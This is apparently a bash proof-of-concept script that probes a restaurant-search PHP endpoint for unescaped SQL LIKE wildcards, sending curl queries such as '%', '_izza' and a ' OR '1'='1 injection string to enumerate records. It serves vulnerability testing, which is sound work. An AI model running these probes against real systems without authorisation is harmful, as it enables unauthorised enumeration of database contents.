#!/bin/bash

# POC: LIKE Wildcard Injection Information Disclosure
# Tests unescaped LIKE wildcard characters (% and _) in search queries
# This demonstrates information disclosure through pattern matching

TARGET="${1:-http://localhost:3000}"
ENDPOINT="/api/search_restaurants.php"

echo "=== LIKE Wildcard Injection POC ==="
echo "Target: $TARGET"
echo ""

# Test 1: Normal search to establish baseline
echo "[*] Test 1: Normal search for restaurants"
RESPONSE=$(curl -s "${TARGET}${ENDPOINT}?query=pizza")
echo "Query: pizza"
echo "Response: $RESPONSE"
echo ""

# Test 2: Using % wildcard to match any characters
echo "[*] Test 2: Using % wildcard for character matching"
echo "Query: P%z (should match Pizza, Pizzeria, etc.)"
RESPONSE=$(curl -s "${TARGET}${ENDPOINT}?query=P%z")
echo "Response: $RESPONSE"
echo ""

# Test 3: Using _ wildcard to match single character
echo "[*] Test 3: Using _ wildcard for single character matching"
echo "Query: _izza (should match Pizza, Mizza, etc. if they exist)"
RESPONSE=$(curl -s "${TARGET}${ENDPOINT}?query=_izza")
echo "Response: $RESPONSE"
echo ""

# Test 4: Multiple wildcards for pattern matching
echo "[*] Test 4: Multiple wildcards pattern"
echo "Query: __zza (should match Pizza or any 5-letter word ending in zza)"
RESPONSE=$(curl -s "${TARGET}${ENDPOINT}?query=__zza")
echo "Response: $RESPONSE"
echo ""

# Test 5: All wildcard to enumerate everything
echo "[*] Test 5: Enumerate all restaurants (%) wildcard"
echo "Query: % (should match all restaurants)"
RESPONSE=$(curl -s "${TARGET}${ENDPOINT}?query=%")
echo "Response: $RESPONSE"
echo ""

# Test 6: Verify SQL injection is NOT present (control test)
echo "[*] Test 6: SQL injection control test (should not execute)"
echo "Query: ' OR '1'='1"
RESPONSE=$(curl -s "${TARGET}${ENDPOINT}?query=%27%20OR%20%271%27=%271")
echo "Response: $RESPONSE"
echo ""

# Test 7: Pattern enumeration - demonstrate character-by-character extraction
echo "[*] Test 7: Character enumeration - P followed by any chars, then a"
echo "Query: P%a (pattern: P[anything]a)"
RESPONSE=$(curl -s "${TARGET}${ENDPOINT}?query=P%a")
echo "Response: $RESPONSE"
echo ""

echo "[+] POC Complete"
echo ""
echo "Analysis:"
echo "- If wildcards are NOT escaped, % and _ will act as SQL LIKE operators"
echo "- Results will show pattern-matching behavior rather than literal string matching"
echo "- Attackers can enumerate database content through repeated pattern queries"
echo "- If wildcards ARE properly escaped, searches should be literal (no matches for patterns)"